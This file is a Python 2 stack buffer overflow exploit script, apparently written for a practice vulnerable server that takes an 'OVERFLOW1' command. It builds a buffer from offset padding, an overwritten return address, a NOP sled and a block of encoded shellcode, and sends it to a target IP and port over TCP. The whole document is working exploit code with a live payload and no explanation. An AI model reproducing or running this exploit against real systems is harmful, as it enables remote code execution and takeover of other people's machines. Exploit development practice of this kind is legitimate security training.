#!/usr/bin/python
import sys
import socket
import time

if len(sys.argv) < 3:
    print "\nUsage: python exploit.py <target ip> <target port> <offset>"
    sys.exit(0)

# TODO
# Change request_body before fuzzing
request_body = "OVERFLOW1 {inputBuffer}\r\n"

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
offset = int(sys.argv[3])

timeout = 10

_offset_buffer = "A" * offset
_eip = "\xaf\x11\x50\x62"
_padding = "\x90" * 100
_payload = "" \
           "\xda\xd7\xd9\x74\x24\xf4\x5a\xbe\x71\xc7\x52\xb0\x2b\xc9\xb1" \
           "\x52\x31\x72\x17\x03\x72\x17\x83\xb3\xc3\xb0\x45\xcf\x24\xb6" \
           "\xa6\x2f\xb5\xd7\x2f\xca\x84\xd7\x54\x9f\xb7\xe7\x1f\xcd\x3b" \
           "\x83\x72\xe5\xc8\xe1\x5a\x0a\x78\x4f\xbd\x25\x79\xfc\xfd\x24" \
           "\xf9\xff\xd1\x86\xc0\xcf\x27\xc7\x05\x2d\xc5\x95\xde\x39\x78" \
           "\x09\x6a\x77\x41\xa2\x20\x99\xc1\x57\xf0\x98\xe0\xc6\x8a\xc2" \
           "\x22\xe9\x5f\x7f\x6b\xf1\xbc\xba\x25\x8a\x77\x30\xb4\x5a\x46" \
           "\xb9\x1b\xa3\x66\x48\x65\xe4\x41\xb3\x10\x1c\xb2\x4e\x23\xdb" \
           "\xc8\x94\xa6\xff\x6b\x5e\x10\xdb\x8a\xb3\xc7\xa8\x81\x78\x83" \
           "\xf6\x85\x7f\x40\x8d\xb2\xf4\x67\x41\x33\x4e\x4c\x45\x1f\x14" \
           "\xed\xdc\xc5\xfb\x12\x3e\xa6\xa4\xb6\x35\x4b\xb0\xca\x14\x04" \
           "\x75\xe7\xa6\xd4\x11\x70\xd5\xe6\xbe\x2a\x71\x4b\x36\xf5\x86" \
           "\xac\x6d\x41\x18\x53\x8e\xb2\x31\x90\xda\xe2\x29\x31\x63\x69" \
           "\xa9\xbe\xb6\x3e\xf9\x10\x69\xff\xa9\xd0\xd9\x97\xa3\xde\x06" \
           "\x87\xcc\x34\x2f\x22\x37\xdf\x5a\xbd\x32\x65\x33\xc3\x3c\x88" \
           "\x9f\x4a\xda\xc0\x0f\x1b\x75\x7d\xa9\x06\x0d\x1c\x36\x9d\x68" \
           "\x1e\xbc\x12\x8d\xd1\x35\x5e\x9d\x86\xb5\x15\xff\x01\xc9\x83" \
           "\x97\xce\x58\x48\x67\x98\x40\xc7\x30\xcd\xb7\x1e\xd4\xe3\xee" \
           "\x88\xca\xf9\x77\xf2\x4e\x26\x44\xfd\x4f\xab\xf0\xd9\x5f\x75" \
           "\xf8\x65\x0b\x29\xaf\x33\xe5\x8f\x19\xf2\x5f\x46\xf5\x5c\x37" \
           "\x1f\x35\x5f\x41\x20\x10\x29\xad\x91\xcd\x6c\xd2\x1e\x9a\x78" \
           "\xab\x42\x3a\x86\x66\xc7\x5a\x65\xa2\x32\xf3\x30\x27\xff\x9e" \
           "\xc2\x92\x3c\xa7\x40\x16\xbd\x5c\x58\x53\xb8\x19\xde\x88\xb0" \
           "\x32\x8b\xae\x67\x32\x9e"
_postfix = ""
inputBuffer = _offset_buffer + _eip + _padding + _payload + _postfix

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((target_ip, target_port))
    s.recv(1024)
    s.send(request_body.format(inputBuffer=inputBuffer))
    s.recv(1024)
    s.close()
    print "\nDone!"
except Exception as e:
    print "Exception occured - " + e.message

